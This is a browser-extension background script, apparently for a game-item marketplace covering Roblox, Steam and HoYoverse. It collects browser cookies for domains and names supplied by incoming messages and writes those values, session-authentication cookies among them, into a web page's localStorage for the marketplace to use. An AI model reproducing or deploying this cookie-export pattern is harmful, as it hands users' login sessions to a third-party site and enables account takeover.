var browser = browser || chrome,
    platforms = {
        'steam': {
            urls: {
                login: [''],
                check: ''
            }
        },
        'roblox': {
            urls: {
                login: ['https://www.roblox.com/Login'],
                check: 'https://www.roblox.com/my/settings/json'
            }
        },
        'hoyoverse': {
            urls: {
                login: [''],
                check: ''
            }
        }
    };

function formatCookie(items) {
    return function (co) {
        for (const item of items) {
            if (
                item.domain === co.domain
                && item.names.indexOf(co.name) !== -1
            ) {
                return JSON.stringify({
                    domain: co.domain,
                    name: co.name,
                    value: co.value
                });
            }
        }
    }
}

function setFromStorage(key, variable) {
    window[variable] = localStorage.getItem(key);
}

function saveToStorage(key, value) {
    localStorage.setItem(key, value);
}

function deleteFromStorage(key) {
    localStorage.removeItem(key);
}

async function fetchJson(url, method = 'GET', obj = {}) {
    let init = {
        method: method,
        headers: {
            'Content-Type': 'application/json'
        }
    };

    if (method === 'POST') {
        init.body = JSON.stringify(obj);
    }

    return await (await fetch(url, init)).json();
}

async function saveCookies(cookies, items) {
    var value = cookies.map(
            formatCookie(items)
        ).filter(
            (c) => c !== undefined
        ),
        storageObj = await browser.storage.session.get();

    // view session  storage - for testing purpose
    browser.scripting.executeScript({
        target: {tabId: storageObj.tabId},
        func: (v) => console.log(v),
        args: [storageObj]
    });

    browser.scripting.executeScript({
        target: {tabId: storageObj.tabId},
        func: deleteFromStorage,
        args: ['ggmarket_auth_cookies']
    });

    if (value.length < items.length) {
        for (const url of platforms[storageObj.platform].urls.login) {
            browser.tabs.create({
                url: url
            });
        }
    } else {
        const
            settings = await fetchJson(platforms[storageObj.platform].urls.check),
            [{result: userName}] = await new Promise(resolve => {
                browser.scripting.executeScript({
                    target: {tabId: storageObj.tabId},
                    func: () => localStorage.getItem('userName'),
                }, resolve)
            });

        if (settings.Name !== userName) {
            if (storageObj.tries < 1) {
                for (const url of platforms[storageObj.platform].urls.login) {
                    browser.tabs.create({
                        url: url
                    });
                }

                browser.storage.session.set({tries: storageObj.tries + 1});
            } else {
                browser.tabs.update(storageObj.tabId, {active: true});
            }
        } else {
            browser.scripting.executeScript({
                target: {tabId: storageObj.tabId},
                func: saveToStorage,
                args: ['ggmarket_auth_cookies', value]
            });
            browser.tabs.update(storageObj.tabId, {active: true});
        }
    }
}

async function getCookies(items) {
    await browser.cookies.getAll(
        {},
        cookies => saveCookies(cookies, items)
    );
}

function handleRequest(message, sender) {
    let storageObj = {tries: 0}, tabId;

    if (message.from === 'popup') {
        storageObj.platform = message.platform;
        tabId = message.tabId;
        storageObj.tabId = tabId;
        browser.storage.session.set(storageObj);
    }

    if (message.from === 'content') {
        storageObj.platform = message.platform;
        tabId = sender?.tab?.id;
        storageObj.tabId = tabId;
        browser.storage.session.set(storageObj);

        browser.scripting.executeScript({
            target: {tabId: tabId},
            func: saveToStorage,
            args: ['tab_id', tabId]
        });
    }

    if (message.items) {
        browser.cookies.getAllCookieStores(() =>
            getCookies(message.items)
        );
    }
}

browser.runtime.onMessage.addListener(handleRequest);
